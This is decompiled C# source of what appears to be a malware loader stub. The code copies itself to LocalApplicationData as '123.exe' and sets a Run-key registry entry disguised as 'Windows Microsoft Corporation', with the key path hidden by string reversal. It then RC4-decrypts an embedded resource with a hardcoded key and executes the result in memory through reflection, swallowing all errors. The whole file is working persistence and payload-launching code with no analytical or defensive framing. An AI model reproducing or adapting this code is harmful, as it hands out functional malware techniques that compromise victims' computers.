using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsWithoutUI;

namespace ns0;

internal sealed class Class0
{
	private static void Main(string[] args)
	{
		object[] array = default(object[]);
		int num = default(int);
		long num2 = default(long);
		string text = default(string);
		RegistryKey registryKey = default(RegistryKey);
		ResourceManager resourceManager = default(ResourceManager);
		byte[] array2 = default(byte[]);
		Assembly assembly = default(Assembly);
		object[] array3 = default(object[]);
		try
		{
			if (!UnhandledExceptionHandlerWithoutUI.AttachApp())
			{
				return;
			}
			array = new object[0];
			num = new Random().Next(300, 750);
			num2 = Environment.TickCount;
			_ = Environment.TickCount - num2;
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\123.exe"))
			{
				File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\123.exe");
			}
			text = smethod_0("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS");
			registryKey = Registry.CurrentUser.OpenSubKey(text, writable: true);
			registryKey.SetValue("Windows Microsoft Corporation", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\123.exe");
			registryKey.Close();
			try
			{
				resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
				array2 = smethod_1((byte[])resourceManager.GetObject("Jnd8vMLADPHU9"), "KfD3iXxmZaR9aN2kSWpgYGaFs7Z5iXzoxydFAmK1VWu81VYgU1CxLfeef");
				resourceManager.ReleaseAllResources();
				assembly = Assembly.Load(array2);
				if (assembly.EntryPoint!.GetParameters().Length > 0)
				{
					array3 = new object[1] { args };
					array = array3;
				}
				assembly.EntryPoint!.Invoke(null, array);
			}
			catch
			{
			}
		}
		catch (Exception exception_)
		{
			UnhandledExceptionHandler.EntryPointException(exception_, new object[10] { array, num, num2, text, registryKey, resourceManager, array2, assembly, array3, args });
		}
	}

	private static string smethod_0(string string_0)
	{
		char[] array = default(char[]);
		try
		{
			array = string_0.ToCharArray();
			Array.Reverse((Array)array);
			return new string(array);
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateException2(exception_, array, string_0);
			throw;
		}
	}

	public static byte[] smethod_1(byte[] byte_0, string string_0)
	{
		byte[] bytes = default(byte[]);
		byte[] array = default(byte[]);
		byte[] array2 = default(byte[]);
		int i = default(int);
		int num = default(int);
		byte b = default(byte);
		int j = default(int);
		int num2 = default(int);
		try
		{
			bytes = Encoding.Default.GetBytes(string_0);
			array = new byte[256];
			array2 = new byte[256];
			for (i = 0; i < 256; i++)
			{
				array[i] = (byte)i;
				array2[i] = bytes[i % bytes.GetLength(0)];
			}
			num = 0;
			for (i = 0; i < 256; i++)
			{
				num = (num + array[i] + array2[i]) % 256;
				b = array[i];
				array[i] = array[num];
				array[num] = b;
			}
			num = 0;
			i = 0;
			for (j = 0; j < byte_0.GetLength(0); j++)
			{
				i = (i + 1) % 256;
				num = (num + array[i]) % 256;
				b = array[i];
				array[i] = array[num];
				array[num] = b;
				num2 = (array[i] + array[num]) % 256;
				byte_0[j] ^= array[num2];
			}
			return byte_0;
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateException10(exception_, bytes, array, array2, b, i, num, j, num2, byte_0, string_0);
			throw;
		}
	}
}
